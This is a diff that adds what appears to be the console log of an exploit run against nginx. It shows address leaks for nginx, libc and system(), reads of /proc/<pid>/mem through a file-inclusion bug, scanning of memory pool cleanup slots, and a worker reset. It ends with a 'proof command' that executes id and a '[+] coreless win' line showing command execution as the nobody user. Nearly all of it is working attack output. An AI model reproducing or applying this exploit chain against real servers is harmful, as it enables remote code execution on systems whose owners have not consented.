@@ -1,0 +1,25 @@
+[*] worker=258 uid=65534 master=7
+[*] nginx_rw=0x555555659000 libc=0x7ffffefc0000 system=0x7fffff010d70
+[*] /proc/258/mem LFI sample: 00000000000000000890655555550000
+[*] held probe nonce=ee094a2910e7 target_low=303030303030
+[*] live mem slots: 115 safe / 2485 total
+[*] live mem pools: cleanup=14 probe=0 overwritten=0 matches=115
+[*] low-byte word diagnostic hits=0
+    match addr=0x5555556b2127 slot=3072 pool=0x5555556a7c08 cleanup=0x5555556a7e10
+    match addr=0x5555556b212f slot=3080 pool=0x5555556a7c08 cleanup=0x5555556a7e10
+    match addr=0x5555556b2137 slot=3088 pool=0x5555556a7c08 cleanup=0x5555556a7e10
+    match addr=0x5555556b2147 slot=3104 pool=0x5555556a7c08 cleanup=0x5555556a7e10
+    match addr=0x5555556b214f slot=3112 pool=0x5555556a7c08 cleanup=0x5555556a7e10
+    match addr=0x5555556b2157 slot=3120 pool=0x5555556a7c08 cleanup=0x5555556a7e10
+    match addr=0x5555556b215f slot=3128 pool=0x5555556a7c08 cleanup=0x5555556a7e10
+    match addr=0x5555556b2167 slot=3136 pool=0x5555556a7c08 cleanup=0x5555556a7e10
+    match addr=0x5555556b216f slot=3144 pool=0x5555556a7c08 cleanup=0x5555556a7e10
+    match addr=0x5555556b2177 slot=3152 pool=0x5555556a7c08 cleanup=0x5555556a7e10
+[*] closing held probe sockets to reset worker
+[*] final worker=259 system=0x7fffff010d70
+[*] proof command: sh -c 'id > /tmp/nginx_rift_proc_mem_9cb95aeab03a 2>&1; printf '"'"'\n__TOKEN__=e391c94bd1c224b9f366a562bdf16208\n'"'"' >> /tmp/nginx_rift_proc_mem_9cb95aeab03a'
+[*] final candidate 1: addr=0x5555556b2127 slot=3072
+[+] coreless win via /proc/<pid>/mem candidate 1: 0x5555556b2127
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+
+__TOKEN__=e391c94bd1c224b9f366a562bdf16208
